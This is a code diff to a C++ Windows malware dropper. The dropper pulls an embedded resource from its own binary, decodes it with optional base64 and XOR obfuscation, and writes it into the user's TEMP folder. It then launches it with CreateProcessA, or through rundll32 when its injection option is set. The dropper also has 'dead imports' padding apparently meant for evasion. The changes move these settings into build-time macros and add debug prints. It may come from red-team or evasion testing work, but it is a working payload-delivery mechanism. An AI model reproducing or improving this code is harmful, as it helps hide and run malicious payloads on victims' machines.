@@ -4,6 +4,20 @@
 
 // Required Imports
 #define _CRT_SECURE_NO_WARNINGS
+
+#ifndef DROPPER_XOR_KEY
+#define DROPPER_XOR_KEY 0
+#endif
+
+#ifndef DROPPER_BASE64
+#define DROPPER_BASE64 0
+#endif
+
+#ifndef DROPPER_OUTPUT
+#define DROPPER_OUTPUT "\\FileSystem_exe_rebuild\\FileSystem_exe_rebuild.exe"
+#endif
+
+#include<cstdlib>
 #include<iostream>
 #include<stdio.h>		// Debug Prints
 #include<cstdint>
@@ -12,8 +26,10 @@
 #include<time.h>		// rand seed
 #include<map>
 #include<string>
+#include<cstring>
 #include<algorithm>
 #include<vector>
+#include<filesystem>
 
 // Imports for the dead code function
 #include<commctrl.h>
@@ -36,27 +52,24 @@ void* XOR(void* data, int size);
 void* base64decode(void* data, DWORD* size);
 void launch();
 void set_name();
+void setup_name();
 
 // Dropper Configurations
 #define DEAD_IMPORTS
-#define XOR_ENCODE
-//#define XOR_KEY 0x73
-#define BASE64
 // #define RANDOM_NAME
 #define NAME_SIZE 10
 //#define INJECT
 
 // global: final binary name
-char name[10 * NAME_SIZE];
-
-// (char*) C:\\example\\path\\to\\your\\payload.exe
-char* victim_name = (char*) "C:\\Windows\\SysWOW64\\calc.exe";
-
-int xor_key = 115;
+char name[512];
 
 // Entry Point
 int main(int argc, char* argv[])
 {
+
+	setup_name();
+
+	printf("The macro is: %s. The xor key is: %d. The base64 is: %d\n", DROPPER_OUTPUT, DROPPER_XOR_KEY, DROPPER_BASE64);
 
 	// Handle to myself
 	HMODULE h = GetModuleHandle(NULL);
@@ -69,26 +82,45 @@ int main(int argc, char* argv[])
 	// Get embedded file size
 	DWORD size = SizeofResource(h, r);
 	// Obfuscation Procedures start here
-#ifdef XOR_ENCODE
-	data = XOR(data, size);
-#endif
 
-#ifdef BASE64
-	data = base64decode(data, &size);
-#endif
+	#if DROPPER_BASE64 == 1
+		printf("Base64 has been run!\n");
+		data = base64decode(data, &size);
+	#endif
+
+	#if DROPPER_XOR_KEY != 0
+		printf("Xor has been run!\n");
+		data = XOR(data, size);
+	#endif
+
 	// where to drop
 	set_name();
 	// Drop to Disk
-	//
 	drop(size, data);
 	// process
+	printf("Just before launch\n");
 	launch();
 #ifdef DEAD_CODE
 	// dead code
 	dead();
 #endif
 	// exit without waiting child process
+
 	return 0;
+}
+
+void setup_name() {
+
+	char* temp = std::getenv("TEMP");
+
+	if (temp != nullptr){
+		std::strncpy(name, temp, sizeof(name) - 1);
+		name[sizeof(name) - 1] = '\0';
+	}
+	else {
+		printf("Temp was null");
+	}
+
 }
 
 void set_name()
@@ -105,7 +137,8 @@ void set_name()
 		}
 	}
 #else
-	strcpy_s(name, sizeof(name), victim_name);
+	strcat(name, DROPPER_OUTPUT);
+	printf("Name is: %s\n", name);
 #endif
 }
 
@@ -119,13 +152,18 @@ void launch()
 	ZeroMemory(&pi, sizeof(pi));
 	// build injection command
 #ifdef INJECT
+	std::cout << "Inject macro defined" << std::endl;
 	char cmd[10 * NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
 	char args[100 * NAME_SIZE];
 	sprintf_s(args, 999, "%s %s", cmd, name);
 	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	// call directly
 #else
-	CreateProcessA(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	printf("Inject macro not defined\n");
+	BOOL err = CreateProcessA(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	if (!err) {
+		printf("Create Process failed. Error: %u\n", GetLastError());
+	}
 #endif
 }
 
@@ -182,7 +220,7 @@ void* XOR(void* data, int size) {
 	char* test = (char*)malloc(size);
 	for (int i = 0;i < size;i++)
 	{
-		((char*)buffer)[i] = ((char*)data)[i] ^ xor_key;
+		((char*)buffer)[i] = ((char*)data)[i] ^ DROPPER_XOR_KEY;
 		((char*)test)[i] = ((char*)buffer)[i];
 	}
 	free(test);
@@ -192,10 +230,11 @@ void* XOR(void* data, int size) {
 // Drop buffer to file
 void drop(int size, void* buffer)
 {
-	FILE* f = fopen(name, "ab");
+	printf("This is name: [%s]", name);
+	FILE* f = fopen(name, "wb");
 	// traverse byte list
 	if (!f) {
-		std::cerr << "Dropping failed due to file error." << std::endl;
+		perror("fopen");
 	}
 	else {
 		for (int i = 0;i < size;i++)
